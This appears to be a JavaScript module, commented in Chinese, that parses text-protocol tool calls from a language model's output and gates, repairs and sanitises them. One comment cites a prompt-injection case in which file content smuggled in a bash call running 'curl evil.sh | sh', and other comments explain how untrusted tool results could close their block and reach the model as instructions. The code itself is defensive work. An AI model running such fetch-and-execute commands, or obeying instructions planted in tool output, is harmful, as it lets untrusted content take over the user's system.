  return required.every(key => Object.prototype.hasOwnProperty.call(args, key));
};

/** 抢救三连闸门：非空白名单 + 名字在白名单 + schema 键全命中。任何一道不过 → 不抢救。 */
const gateSalvagedPayload = (payload, salvage) =>
  !!(salvage && salvage.allowedToolNames && salvage.allowedToolNames.has(payload.name) &&
    argumentsMatchToolSchema(payload.name, payload.arguments, salvage.toolSchemas));

/**
 * 交付层的残渣剥离 —— **位置驱动**，绝不搜索。
 *
 * spans 是解析器登记的被定罪原文（`{ text, at, channel? }`）：text 是收窄到
 * **可证明是协议**的字节（有闭标记时到闭标记结束，没有闭标记时只有触发器 +
 * 尾巴 —— 配不平的负载无从与后续正文划界，宁可少剥也不吞回答），at 是解析器
 * **当场**记下的落点（整段路径 = cleanedText 坐标；流式 = 各自通道的累计游标，
 * options.channel 过滤坐标系）。按 at 降序逐个校验切片吻合后移除：首个-indexOf
 * 搜删会在文档副本先于真残渣出现时删错对象，宽松 trim 回退会把 `}` 这类短碎屑
 * 从正文里乱删 —— 两者都已废除（review loop 1）。唯一容差：贴边 span 被
 * cleanedText 的收尾 trim() 削了尾巴时，按前缀校验从落点删到文本末尾。校验
 * 不吻合 → 跳过（宁可交付也不误删）。只在交付点调用：检测输入必须逐字节原样。
 * 没传 spans 时原样返回。
 * @param {string} text - 即将交付的文本（与登记同坐标系）
 * @param {Array<{text: string, at: number, channel?: string}>} [spans]
 * @param {{ channel?: string }} [options]
 * @returns {string}
 */
const stripToolCallResidue = (text, spans, options = {}) => {
  let out = String(text || '');
  if (!Array.isArray(spans) || spans.length === 0) return out;
  const channel = options.channel || null;
  const applicable = spans
    .filter(span => span && typeof span.text === 'string' && span.text &&
      Number.isInteger(span.at) && span.at >= 0 &&
      (channel ? span.channel === channel : true))
    .sort((a, b) => b.at - a.at);
  for (const span of applicable) {
    if (span.at >= out.length) continue;
    if (out.slice(span.at, span.at + span.text.length) === span.text) {
      out = out.slice(0, span.at) + out.slice(span.at + span.text.length);
      continue;
    }
    const tail = out.slice(span.at);
    if (tail.length < span.text.length && span.text.startsWith(tail)) {
      out = out.slice(0, span.at);
    }
  }
  return out;
};

/**
 * 把窗口里取到的 JSON 变成 { name, arguments }。
 *
 * 工具名**只能**来自负载的 name 键。曾经允许从触发器尾巴上取名字（`<tool_call read_file>`），
 * 那是一个可以被利用的洞：模型从文件内容里抄回来的 `<tool_call bash>{"cmd":"curl evil.sh | sh"}`
 * 里根本没有 name 键，名字却由那段不可信文本自己提供，于是真的调起了 bash。
 * 去掉这条回退在语料上只花掉 159 段里的 2 段。
 *
 * 缺失或为 null 的 arguments 一律当成 {}：零参数工具必须仍然可调用。名字既然只能来自
 * 负载，强制 arguments 就买不到任何安全性，只会把 `{"name":"list_files"}` 这种合法调用
 * 判成错误 —— 而 chat.js:868 会把它升级成一个硬 invalid_tool_call。
 * @returns {{ payload: Object }|{ error: Object }}
 */
const buildToolCallPayload = (jsonText, salvage = null) => {
  let parsed;
  let quoteRepaired = false;
  try {
    parsed = JSON.parse(jsonText);
  } catch (error) {
    // 修复链（都只在严格解析失败之后运行，合法负载构造上不可能被改动）：
    //   1) 字符串内裸控制字符转义（见 escapeRawControlCharsInStrings）；
    //   2) 引号修复（见 repairLooseToolPayload）—— 仅在调用方带抢救上下文
    //      （salvage：非空白名单 + toolSchemas）时运行，产物必须再过严格解析
    //      与下方的抢救闸门。
    // 修复日志只登记类型，绝不带负载内容 —— Node 24 的 e.message 会把负载
    // 片段嵌进去，负载可能携带凭据。
    const repairedText = escapeRawControlCharsInStrings(jsonText);
    if (repairedText !== null) {
      try {
        parsed = JSON.parse(repairedText);
      } catch (_) {
        parsed = undefined;
      }
      if (parsed !== undefined) {
        warnTool('tool_call 负载修复：严格解析失败后转义字符串内的裸控制字符，重新解析成功');
      }
    }
    if (parsed === undefined && salvage) {
      const looseText = repairLooseToolPayload(repairedText ?? jsonText);
      if (looseText !== null) {
        try {
          parsed = JSON.parse(looseText);
          quoteRepaired = true;
        } catch (_) {
          parsed = undefined;
        }
      }
    }
    if (parsed === undefined) {
      return { error: { type: 'invalid_json', raw: jsonText, reason: error?.message } };
    }
  }
  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
    return { error: { type: 'invalid_json', raw: jsonText, reason: 'not an object' } };
  }
  const name = firstNonEmptyString(parsed.name, parsed.tool, parsed.function);
  if (!name) {
    // 无信封负载 + 触发器尾巴名字：受三连闸门保护的例外（见 extractTriggerNameHint）。
    // 整个已解析对象就是 arguments。闸门不满足 → 拒绝且**独立定型**为
    // salvage_rejected（review loop 1，条目 11）：这正是本防御瞄准的可诊断类，
    // 不能在日志里冒充真正的坏 JSON。绝不执行。
    if (salvage?.nameHint) {
      const candidate = { name: salvage.nameHint, arguments: parsed };
      if (gateSalvagedPayload(candidate, salvage)) {
        warnTool(`tool_call 负载抢救：无信封负载采用触发器尾巴名字，白名单 + schema 闸门放行${quoteRepaired ? '（含引号修复）' : ''}`);
        return { payload: candidate };
      }
      return { error: { type: 'salvage_rejected', raw: jsonText, reason: 'name-hint candidate failed the allowlist/schema gate' } };
    }
    return { error: { type: 'invalid_json', raw: jsonText, reason: 'no tool name' } };
  }
  const payload = { name, arguments: parsed.arguments ?? parsed.parameters ?? parsed.args ?? {} };
  // 引号修复的产物（以及 forceGate 的抢救调用方，见 salvageTruncatedSpan）必须
  // 整体过抢救闸门：修复把一个值劈成幻影键时 schema 闸门拒绝，回到错误路径 ——
  // 同样定型为 salvage_rejected（可诊断，不冒充坏 JSON）。
  if (quoteRepaired || salvage?.forceGate) {
    if (!gateSalvagedPayload(payload, salvage)) {
      return { error: { type: 'salvage_rejected', raw: jsonText, reason: 'repaired payload failed the allowlist/schema gate' } };
    }
    if (quoteRepaired) {
      warnTool('tool_call 负载抢救：引号修复后严格解析成功，白名单 + schema 闸门放行');
    }
  }
  return { payload };
};

/**
 * truncated_tool_call 定罪点的最后一搏：负载配不平（引号奇偶被打破）的整段，
 * 在按错误落账**之前**跑一次完整抢救。
 *
 * 步骤：先用方括号闭标记扫描把区间截到 `[END TOOL CALL]` 之前（配平已死，
 * 闭标记是这段里**唯一**还可信的定界证据 —— 没有闭标记就没有抢救：配不平的
 * 负载无从与后续正文划界，尾巴按构造可能是真实回答，消费它就是吞回答
 * （frozen Always，review loop 1））；对区间跑引号修复；修复文本上重新配平
 * 取对象；对象再走 buildToolCallPayload 全链（严格解析 → 控制字符转义 →
 * 信封 / nameHint，forceGate 让信封形态也过白名单 + schema 抢救闸门）。
 * 任何一步失手 → 返回 null，调用方照今天定罪。成功时整段（含闭标记、含对象
 * 之后的协议碎屑，如事故 3 的多余 `}`）都被消费 —— 闭标记以内按构造是协议
 * 残渣，不是回答。每段只跑一次、O(span)。
 * @param {string} spanText - 从负载 '{' 起的原文
 * @param {Object} salvage - { allowedToolNames, toolSchemas, nameHint }
 * @returns {{ payload: Object, end: number }|null} end = spanText 里闭标记之后的下标
 */
const salvageTruncatedSpan = (spanText, salvage) => {
  if (!salvage) return null;
  const closerMatch = spanText.match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
  if (!closerMatch) return null;
  const region = spanText.slice(0, closerMatch.index);
  const repairedRegion = repairLooseToolPayload(region);
  if (repairedRegion === null) return null;
  const object = extractBalancedObject(repairedRegion, 0);
  if (!object) return null;
  const built = buildToolCallPayload(object.text, { ...salvage, forceGate: true });
  if (built.error) return null;
  warnTool(`truncated_tool_call 抢救成功：引号修复后负载配平并通过全部闸门（span ${spanText.length} 字符）`);
  return {
    payload: built.payload,
    end: closerMatch.index + closerMatch[0].length
  };
};

/** allowedToolNames 闸门。两条路径共用同一个，任何一侧都不会漏掉。 */
const gateToolName = (payload, allowedToolNames) => {
  if (allowedToolNames && !allowedToolNames.has(payload.name)) {
    return { type: 'unknown_tool', name: payload.name };
  }
  return null;
};

// logger 上只有 warn，没有 warning。原来满仓库的 `logger.warning?.(...)` 因此是空操作 ——
// 这正是“标签写坏了却一行日志都没有”的另一半原因。
const warnTool = (message, data) => logger.warn?.(message, 'TOOL', '', data ?? null);

// invalid_json 的 reason 是 JSON.parse 的 e.message —— 现代 V8 会把负载片段原文嵌进去
// （`Unexpected token 'S', ..."<负载回显>"... is not valid JSON`）。错误**对象**保留完整
// reason（重试提示与测试依赖它），但日志层只放行开头的错误种类：砍在第一个引号 /
// 换行 / " in JSON" / " at position" 边界，并封顶长度。诊断需要的是原因，不是内容。
const sanitizeJsonReasonForLog = (reason) => {
  const text = String(reason || '');
  const cut = text.search(/["'`‘’“”\n\r]| in JSON| at position/i);
  const head = (cut === -1 ? text : text.slice(0, cut)).trim();
  return (head || 'invalid_json').slice(0, 120);
};

// 只登记“为什么失败”和“多长”，绝不把负载本身打进日志：工具参数里可能有凭据、
// 令牌或 email:password。诊断需要的是原因，不是内容。
const logToolError = (error) => {
  if (!error) return;
  if (error.type === 'unknown_tool') {
    warnTool(`工具调用被拒绝：${error.name} 不在 allowedToolNames 里`);
    return;
  }
  const size = typeof error.raw === 'string' ? error.raw.length : 0;
  const reason = error.type === 'invalid_json'
    ? sanitizeJsonReasonForLog(error.reason)
    : (error.reason || error.type);
  warnTool(`解析 tool_call 负载失败（${reason}，负载 ${size} 字符）`);
};

// 触发器被当成文档压制掉时也要留痕。静默压制正是这次要消灭的失败类型：
// 真实调用变成纯文本，既没有错误也没有警告，没人看得见。
const logTriggerSuppressed = (trigger, why) => {
  warnTool(`tool_call 触发器按${why}处理，未识别为调用`, trigger);
};

const logTriggeredUnrecovered = (trigger) => {
  warnTool(
    `出现 tool_call 触发器，但其后 ${TOOL_CALL_PAYLOAD_WINDOW} 字符窗口内没有可用负载，按正文放行`,
    trigger
  );
};

const normalizeAllowedToolNames = (allowedToolNames) => {
  if (!allowedToolNames) return null;
  const names = allowedToolNames instanceof Set ? allowedToolNames : new Set(allowedToolNames);
  return names.size > 0 ? names : null;
};

// 上游 delta 的"正文"phase 集合。单一来源：chat-helpers.js 的归一化器与下面的原生
// 累积器共用（chat-helpers 已依赖本模块，反向引用会成环，所以定义放在这里）。
const ANSWER_PHASES = new Set(['answer', 'final', 'final_answer', 'response']);

const serializeToolArguments = (args) => {
  if (typeof args === 'string') {
    try {
      JSON.parse(args);
      return args;
    } catch (_) {
      return JSON.stringify(args);
    }
  }
  return JSON.stringify(args ?? {});
};

const compactDescription = (value, maxLength = 320) => {
  const text = String(value || '').replace(/\s+/g, ' ').trim();
  if (text.length <= maxLength) return text;
  return `${text.slice(0, maxLength - 1)}…`;
};

/**
 * 识别模型用“我将执行/Let me inspect”代替真实工具调用的占位回复。
 * 仅匹配明确的动作动词，避免把普通解释或建议误判成工具回合。
 */
const looksLikeUnexecutedToolAction = (value) => {
  const text = String(value || '').trim().replace(/^[#>*\-\s]+/, '');
  const english = /^(?:i(?:['’]ll| will)|let me|i need to|next,?\s+i(?:['’]ll| will))\s+(?:now\s+)?(?:run|execute|check|inspect|read|edit|write|search|open|call|use|look|test|verify|build|deploy|create|update|fetch)\b/i;
  const chinese = /^(?:我(?:将|会|先|需要|正在)|让我|接下来(?:我)?(?:将|会|先)?|现在(?:我)?(?:将|会|先|来)?|下面(?:我)?(?:将|会|先)?|正在)(?:立即|马上|先|来)?(?:运行|执行|检查|查看|读取|编辑|修改|写入|搜索|打开|调用|使用|测试|验证|构建|部署|创建|更新|获取)/;
  return english.test(text) || chinese.test(text);
};

// 协议残渣检测：模型把方括号协议写坏时（孤儿 [END TOOL CALL] 闭标记，或答案
// 开头直接是 {"name":…,"arguments":…} 负载而没有开触发器），泄漏为可见正文时
// 点起 malformed_protocol 重试。负载形状那一半与合成开端共用同一个谓词
// （isLeakedToolPayloadShape，见其注释）：抢救的闸门放行成调用的，永远不会
// 再落进这里；被闸门拒绝按正文放行的，正好被这里接住。
// 闭标记扫描复用上面的有界正则，仅去掉行首锚点以便在整段文本中查找。
const TOOL_CALL_CLOSE_BRACKET_SCAN_RE = new RegExp(TOOL_CALL_CLOSE_BRACKET_RE.source.replace(/^\^/, ''), 'i');
const containsOrphanProtocolResidue = (value) => {
  const text = String(value || '');
  if (TOOL_CALL_CLOSE_BRACKET_SCAN_RE.test(text)) return true;
  return isLeakedToolPayloadShape(text);
};

// 合成开端被闸门拒绝时留痕。与其他工具日志同一条纪律：只登记原因，绝不把负载
// 内容打进日志（可能携带凭据）。拒绝不是错误（不进 errors）：tool_error 会抢在
// malformed_protocol 之前把重试断掉，被拒绝的文本必须按正文放行、让残渣检测
// 照老规矩接手。
const logSyntheticRejected = (reason) => {
  warnTool(`裸负载抢救被拒绝（${reason}），按正文放行`);
};

/**
 * 孤儿方括号闭标记的登记（review loop 2）：`[END TOOL CALL]` 独自出现在正文里时
 * 从不进扫描循环（触发器正则不认 `[END`），却是**无歧义**的协议残渣 —— 合法回答
 * 里出现它的概率≈0，写侧的 neutraliseResultMarkers 还在结果正文里主动打瘸它。
 * 在最终 cleanedText 上补一遍登记，交付层照登记位置剥掉；只登记、绝不改动
 * cleanedText —— 检测输入（containsOrphanProtocolResidue 据它点火 malformed_protocol
 * 重试）保持逐字节原样，剥离仍然只发生在交付点。
 *
 * 两条豁免：（1）围栏/行内代码里的例子按构造不是残渣（同一套 code tracker，
 * 在**交付文本**上走 —— 读者看到的就是这份）；（2）已登记 span 内部的闭标记
 * 不重复登记 —— 重叠条目会让降序剥离互相拆台（先剥内层，外层校验就配不上了）。
 * @param {string} text - 最终 cleanedText（登记坐标系）
 * @param {Array<{text: string, at: number}>} spans - 既有登记簿，就地追加
 */
const recordOrphanBracketClosers = (text, spans) => {
  if (!TOOL_CALL_CLOSE_BRACKET_SCAN_RE.test(text)) return;
  const tracker = createCodeContextTracker();
  let from = 0;
  for (;;) {
    const match = text.slice(from).match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
    if (!match) return;
    const at = from + match.index;
    tracker.consume(text.slice(from, at));
    const insideRecorded = spans.some(span =>
      typeof span.text === 'string' && at >= span.at && at < span.at + span.text.length);
    if (!tracker.inCode() && !insideRecorded) {
      spans.push({ text: match[0], at });
    }
    tracker.consume(text.slice(at, at + match[0].length));
    from = at + match[0].length;
  }
};

const createToolCallObject = (payload, index = 0, id = null) => ({
  index,
  id: id || `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`,
  type: 'function',
  function: {
    name: payload.name,
    arguments: serializeToolArguments(payload.arguments)
  }
});

/**
 * 将 JSON Schema 类型压缩为简短 TypeScript 风格签名
 * @param {Object} schema - JSON Schema 节点
 * @returns {string} TS 风格类型表示
 */
const compressSchemaType = (schema) => {
  if (!schema || typeof schema !== 'object') {
    return 'any';
  }

  if (Array.isArray(schema.enum) && schema.enum.length > 0) {
    return schema.enum.map(value => JSON.stringify(value)).join(' | ');
  }

  const type = schema.type;

  if (type === 'array') {
    const itemType = compressSchemaType(schema.items);
    return `${itemType}[]`;
  }

  if (type === 'object') {
    if (!schema.properties || typeof schema.properties !== 'object') {
      return 'object';
    }
    const requiredKeys = new Set(Array.isArray(schema.required) ? schema.required : []);
    const fields = Object.entries(schema.properties).map(([key, value]) => {
      const optional = requiredKeys.has(key) ? '' : '?';
      const description = compactDescription(value?.description, 180);
      return `${key}${optional}: ${compressSchemaType(value)}${description ? ` /* ${description.replace(/\*\//g, '* /')} */` : ''}`;
    });
    return `{ ${fields.join('; ')} }`;
  }

  if (Array.isArray(type)) {
    return type.map(t => compressSchemaType({ ...schema, type: t })).join(' | ');
  }

  return type || 'any';
};

/**
 * 将单个工具定义压缩为 TS 风格签名
 * @param {Object} tool - OpenAI 工具定义
 * @returns {string} 压缩后的工具描述
 */
const compressToolDefinition = (tool) => {
  const fn = tool?.function || tool;
  const name = fn?.name || 'unknown';
  const description = compactDescription(fn?.description);
  const params = fn?.parameters || { type: 'object', properties: {} };
  const signature = compressSchemaType(params);

  if (description) {
    return `- ${name}${signature}\n  ${description}`;
  }
  return `- ${name}${signature}`;
};

/**
 * 构建用于注入 system 消息的工具调用提示词
 * @param {Array<Object>} tools - OpenAI 风格工具定义列表
 * @param {Object} [options] - 可选参数
 * @param {string|Object} [options.tool_choice] - OpenAI tool_choice 参数
 * @returns {string} 完整的工具调用系统提示词
 */
const buildToolSystemPrompt = (tools, options = {}) => {
  if (!Array.isArray(tools) || tools.length === 0) {
    return '';
  }

  const compressed = tools
    .map(compressToolDefinition)
    .filter(Boolean)
    .join('\n');

  const lines = [
    '# Tools',
    '',
    'You have access to the following tools. This is an Agent tool protocol, not a suggestion.',
    '',
    '## Available tools',
    compressed,
    '',
    '## Output format',
    'Emit each tool invocation as:',
    '',
    TOOL_CALL_OPEN,
    '{"name": "<tool_name>", "arguments": {<json_arguments>}}',
    TOOL_CALL_CLOSE,
    '',
    'Tool results come back to you as user messages in this form:',
    '',
    `${TOOL_RESULT_OPEN}<tool_name>]`,
    '<result text or JSON>',
    TOOL_RESULT_CLOSE,
    '',
    'Rules:',
    `- If the task requires reading, writing, editing, searching, shell execution, browser use, or any action covered by an available tool, your visible response MUST be a \`${TOOL_CALL_OPEN}\` block. Call the tool instead of describing the action.`,
    '- A tool call must be the first non-whitespace content of the visible answer. Do not write “I will…”, “Let me…”, “我将…”, “正在…”, a plan, or a completion claim before it.',
    `- The JSON inside \`${TOOL_CALL_OPEN}\` must be valid and on a single logical block.`,
    `- Write the opening marker as exactly \`${TOOL_CALL_OPEN}\` and the closing marker as exactly \`${TOOL_CALL_CLOSE}\`, each on its own line. They never take attributes, an id, or the tool name — everything the call needs is inside the JSON.`,
    '- Use the exact tool name listed above.',
    '- Provide all required arguments; omit unknown ones.',
    `- You may emit multiple \`${TOOL_CALL_OPEN}\` blocks back-to-back when more than one tool is needed.`,
    '- After every tool result, evaluate the actual task state. If work remains, emit the next tool call. Only return a normal-language final answer after the requested task is genuinely complete or you are blocked on user input.',
    '- Never claim that a file was changed, a command succeeded, or a result was verified unless the corresponding tool result proves it.',
    `- Do not call nonexistent tools, fabricate tool results, wrap \`${TOOL_CALL_OPEN}\` in code fences, or mix extra commentary into a tool-call turn.`,
    '- A non-tool response is valid only when it explicitly declares its state: use the completion or blocked wrapper below. Bare prose is invalid.',
    `- Verified completion: ${AGENT_FINAL_OPEN}final report${AGENT_FINAL_CLOSE}`,
    `- Requires user input/authority: ${AGENT_BLOCKED_OPEN}exact blocker${AGENT_BLOCKED_CLOSE}`,
    '- Never emit the completion wrapper after merely finishing one intermediate tool action; continue with another tool call until every requested outcome is verified.'
  ];

  const choice = options.tool_choice;
  if (choice === 'required') {
    lines.push('- You MUST call at least one tool before answering.');
  } else if (choice && typeof choice === 'object' && choice.function?.name) {
    lines.push(`- You MUST call the tool \`${choice.function.name}\` first.`);
  } else if (choice === 'none') {
    lines.push('- Do NOT call any tool for this turn; respond as plain text.');
  }

  return lines.join('\n');
};

/**
 * 将历史中的 assistant tool_calls / tool 角色消息折叠成纯文本，
 * 以便上游网页接口（仅识别 user/assistant/system）能正确接收上下文。
 * 折叠时保留原始 tool_call_id，并将后续 role=tool 消息按 id 精确回链。
 * @param {Array<Object>} messages - 原始 OpenAI 风格消息数组
 * @returns {Array<Object>} 折叠后的消息数组
 */
const foldToolMessages = (messages) => {
  if (!Array.isArray(messages)) return messages;

  const callIdToName = new Map();

  return messages.map((message) => {
    if (!message || typeof message !== 'object') return message;

    const assistantCalls = message.role === 'assistant'
      ? (Array.isArray(message.tool_calls) && message.tool_calls.length > 0
        ? message.tool_calls
        : (message.function_call?.name ? [message.function_call] : []))
      : [];
    if (assistantCalls.length > 0) {
      const blocks = assistantCalls.map((call) => {
        const fn = call?.function || call;
        let args = fn?.arguments;
        if (typeof args === 'string') {
          try {
            args = JSON.parse(args);
          } catch (_) {
            // 保留原始字符串形式
          }
        }
        const name = fn?.name || 'unknown';
        const id = call?.id || `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`;
        callIdToName.set(id, name);
        // 提示词里写的是 {name, arguments} 两个键，这里也只写两个。多出来的 id 是
        // <tool_call_id_1> 这一族坏标签的种子，而模型从来没有自己吐出过 id（name ×36、id ×0）。
        // callIdToName 仍然留着 id，用来给下面的结果消息定名。
        const payload = { name, arguments: args ?? {} };
        return `${TOOL_CALL_OPEN}\n${JSON.stringify(payload)}\n${TOOL_CALL_CLOSE}`;
      });
      const original = typeof message.content === 'string' ? message.content : '';
      return {
        role: 'assistant',
        content: [original, blocks.join('\n')].filter(Boolean).join('\n')
      };
    }

    if (message.role === 'tool' || message.role === 'function') {
      const callId = message.tool_call_id || '';
      const name = message.name || callIdToName.get(callId) || (message.role === 'function' ? 'function' : 'tool');
      const content = typeof message.content === 'string'
        ? (message.content || 'null')
        : JSON.stringify(message.content ?? null);
      return {
        role: 'user',
        content: `${TOOL_RESULT_OPEN}${sanitizeMarkerName(name)}]\n${neutraliseResultMarkers(content)}\n${TOOL_RESULT_CLOSE}`
      };
    }

    return message;
  });
};

/**
 * 结果正文必须对它自己封闭。工具结果是**不可信内容** —— 文件、网页、命令输出 —— 里面
 * 完全可能出现 `[END TOOL RESULT]`。原样写出去，块就在那里提前结束，后面的内容就变成了
 * 对模型说的话。把正文里的标记打断，让它再也关不掉这个块。
 * @param {string} value - 原始结果正文
 * @returns {string} 标记已失效的正文
 */
const neutraliseResultMarkers = (value) => String(value)
  .replace(/\[[ \t]*END[ \t]+TOOL[ \t]+RESULT[ \t]*\]/gi, '(END TOOL RESULT)')
  .replace(/\[[ \t]*TOOL[ \t]+RESULT[ \t]*:/gi, '(TOOL RESULT:')
  // 调用标记同样要在结果正文里失效：不可信内容里的 `[TOOL CALL]` / `<tool_call>`
  // 一旦被模型原样引用到回答开头，就是一个可以点火的触发器。把头字符换掉，
  // 触发器正则（与之锁步）就永远匹配不上。
  .replace(/\[(?=[ \t]{0,4}tool[ \t_-]{1,2}calls?)/gi, '(')
  .replace(/\[(?=[ \t]{0,4}(?:END[ \t_-]{1,2}|\/[ \t]{0,4})TOOL[ \t_-]{1,2}CALLs?)/gi, '(')
  // i 标志不可省：TOOL_CALL_TRIGGER_RE 的尖括号臂是 case-insensitive，缺 i 时
  // `<TOOL_CALL>` 从不可信正文里原样漏过，被模型引用到回答开头就能点火调起工具。
  .replace(/<(?=[ \t]{0,4}\/?[ \t]{0,4}tool_calls?)/gi, '(');

/**
 * 结果标记占一整行，工具名里不能出现会把它撑破的字符
 * @param {string} value - 原始工具名
 * @returns {string} 可安全放进标记行的名字
 */
const sanitizeMarkerName = (value) => String(value || '')
  .replace(/[[\]\r\n]/g, ' ')
  .trim() || 'tool';

/**
 * 从完整文本中提取所有工具调用
 * @param {string} fullText - 模型完整输出
 * @param {Object} [options]
 * @param {Set<string>|Array<string>} [options.allowedToolNames]
 * @returns {{ cleanedText: string, toolCalls: Array<Object>, errors: Array<Object>, warnings: Array<Object> }}
 */
const parseToolCallsFromText = (fullText, options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  // 无非空白名单就无抢救：名字闸门在旧语义下放行一切，抢救会给未声明的名字
  // 捏出 tool_use。正则触发器保持旧行为。
  const salvage = !!allowedToolNames;
  // 引号修复 / 尾巴名字抢救的上下文：非空白名单**且** toolSchemas 齐备才存在
  // （fail closed —— schema 闸门是抢救的一半边界）。只有 anthropic 路径传
  // toolSchemas；chat.js / openai 路径不传，行为不变。
  const repairSalvage = allowedToolNames && options.toolSchemas
    ? { allowedToolNames, toolSchemas: options.toolSchemas }
    : null;
  // 快路径必须与识别器同步：正则触发器**或**（抢救开启时）答案开头的裸负载形状，
  // 二者都算“可能有调用”。只测正则的话，合成开端在这里就被拦掉了。
  // 快路径的文本照样要登记孤儿闭标记（`[END TOOL CALL]` 不点火任何触发器，
  // 正是从这里原样穿过的）—— cleanedText 本身逐字节不动。
  if (typeof fullText !== 'string' ||
      !(TOOL_CALL_TRIGGER_RE.test(fullText) || (salvage && isLeakedToolPayloadShape(fullText)))) {
    const fastPathSpans = [];
    if (typeof fullText === 'string') recordOrphanBracketClosers(fullText, fastPathSpans);
    return { cleanedText: fullText || '', toolCalls: [], errors: [], warnings: [], residueSpans: fastPathSpans };
  }

  const toolCalls = [];
  const errors = [];
  const warnings = [];
  // 被定罪原文的登记簿：`{ text, at }`，at = 登记当刻 cleanedText 的长度（位置
  // 驱动的剥离，见 stripToolCallResidue）。只登记**确实落进 cleanedText、且可
  // 证明是协议**的残渣：truncated 定罪段（收窄到闭标记或触发器+尾巴）与合成
  // debris。被闸门拒绝的合成负载（releaseRejectedSpan）**不登记** —— 按它自己
  // 的教义可能就是回答本身，永远不可剥离（review loop 1）。被整段吞掉的（not
  // the first content）没有可剥离的字节，不登记；围栏里的文档在触发器阶段就被
  // 按正文压制，由构造永远不进这里。
  const residueSpans = [];
  const code = createCodeContextTracker();

  let cleanedText = '';
  let position = 0;
  let emittedProse = false;

  // 只有真正被消费成调用的那一段才从正文里移除。被拒绝的一段连触发器一起还回去：
  // 触发器本身就可能是句子的一部分（"your visible response MUST be a `<tool_call>` block"），
  // 只还负载会把两侧的字符黏在一起。
  const releaseProse = (text) => {
    if (!text) return;
    code.consume(text);
    cleanedText += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  // 被消费掉的调用片段（成功或失败）不算“正文已经开始”，也不喂给代码上下文追踪器：
  // 模型连写两个调用、第一个写坏时，第二个仍然是回答的开头；而负载里的反引号是 JSON
  // 字符串的内容，不是 Markdown 标记，喂进去会让围栏状态永久错位。
  const releaseDebris = (text) => { cleanedText += text; };

  // 被闸门拒绝的合成负载：可见（进 cleanedText，残渣检测据此点火）、**置位**
  // emittedProse（一个形状完整却没过闸门的对象跟普通 JSON 答案无法区分 —— 不关
  // 这扇门，答案后面被模型引用的触发器就能点火执行）、但不喂围栏追踪器（负载
  // 字符串里行首的 ``` 不是 Markdown，喂进去会把后续真触发器整段误判成文档）。
  const releaseRejectedSpan = (text) => {
    if (!text) return;
    cleanedText += text;
    if (/\S/.test(text)) emittedProse = true;
  };

  /**
   * 合成开端（from 指向 '{'）的结算。全部闸门 —— 负载配平、强制闭标记（邻接规则）、
   * 名字只来自负载且过白名单 —— 通过才成为调用；任何一道不过，整段按**可见文本**
   * 放行：绝不进 recoveredText（chat.js 旧路径丢弃 recoveredText，误吞的真回答会
   * 消失），也绝不进 errors（tool_error 抢在 malformed_protocol 之前断掉重试；被
   * 拒绝的形状必须原样落进可见正文，让残渣检测按老规矩点火）。与流式路径的同名
   * 分支逐字对齐，parity 由测试钉住。
   * @returns {number} 新的扫描位置
   */
  const resolveSyntheticAt = (from) => {
    const object = extractBalancedObject(fullText, from);
    if (!object) {
      // 配不平的候选是被消费的协议残片，不是正文（releaseDebris 同一条先例：
      // 成功或失败都不算“正文已经开始”）—— 残片按 debris 放行到下一个正则触发器
      // 为止，从那里恢复正常解析。一刀切吞到文本末尾会毁掉后面写对了的调用。
      warnings.push({ type: 'synthetic_rejected', reason: 'unbalanced payload', raw: '' });
      logSyntheticRejected('unbalanced payload');
      const next = fullText.slice(from).match(TOOL_CALL_TRIGGER_RE);
      const cut = next ? from + next.index : fullText.length;
      residueSpans.push({ text: fullText.slice(from, cut), at: cleanedText.length });
      releaseDebris(fullText.slice(from, cut));
      return cut;
    }
    const closer = consumeMandatoryBracketCloser(fullText, object.end, false);
    if (!closer.found) {
      // 闭标记缺席或邻接违规：负载按可见文本放行，尾巴交还扫描循环。
      // 不进登记簿：被拒绝的负载可能就是回答本身（见登记簿头注释）。
      warnings.push({ type: 'synthetic_rejected', reason: 'missing closer', raw: '' });
      logSyntheticRejected('missing closer');
      releaseRejectedSpan(object.text);
      return object.end;
    }
    const built = buildToolCallPayload(object.text, repairSalvage);
    const gateError = built.error || gateToolName(built.payload, allowedToolNames);
    if (gateError) {
      // 只登记错误**类型**：invalid_json 的 reason 是 JSON.parse 的 e.message，
      // 现代 V8 会把负载片段嵌进去 —— 负载可能带凭据，绝不进日志或 warnings。
      // 不进登记簿：被拒绝的负载可能就是回答本身（见登记簿头注释）。
      warnings.push({ type: 'synthetic_rejected', reason: gateError.type, raw: '' });
      logSyntheticRejected(gateError.type);
      releaseRejectedSpan(fullText.slice(from, closer.end));
      return closer.end;
    }
    toolCalls.push(createToolCallObject(built.payload, toolCalls.length));
    return consumeDuplicateClosers(fullText, closer.end, false).end;
  };

  while (position < fullText.length) {
    // 代码上下文并进位置门：围栏/行内代码里的裸负载永远是文档，不产生合成开端
    // （正则触发器的代码上下文处理保持原样，在下面按老规矩压制）。
    const opening = matchToolCallOpening(fullText.slice(position), {
      emittedProse: emittedProse || code.inCode(),
      canSalvage: salvage
    });
    if (!opening) break;

    const triggerAt = position + opening.index;
    releaseProse(fullText.slice(position, triggerAt));

    if (opening.synthetic) {
      position = resolveSyntheticAt(triggerAt);
      continue;
    }

    const trigger = opening.text;
    const afterTrigger = triggerAt + trigger.length;

    const suppress = (reason, log) => {
      warnings.push({ type: 'triggered_unrecovered', reason, raw: trigger });
      log(trigger, reason);
      releaseProse(trigger);
      position = afterTrigger;
    };

    // 代码围栏 / 行内代码里的例子必须保持是例子 —— 原样留在正文里，但要留痕，不能静默。
    if (code.inCode()) {
      suppress('inside code context', logTriggerSuppressed);
      continue;
    }

    const payloadAt = findPayloadStart(fullText, afterTrigger, false);
    if (payloadAt < 0) {
      // 触发了却什么都凑不出来。以前这里完全无声，问题因此一直看不见。
      suppress('no payload in window', logTriggeredUnrecovered);
      continue;
    }

    // `[tool calls](url) … {json}`：方括号触发器后面接的是 Markdown 链接收尾，不是调用。
    if (isMarkdownLinkTail(trigger, fullText.slice(afterTrigger, payloadAt))) {
      suppress('markdown link, not a call', logTriggerSuppressed);
      continue;
    }

    const object = extractBalancedObject(fullText, payloadAt);
    const tail = fullText.slice(afterTrigger, payloadAt);
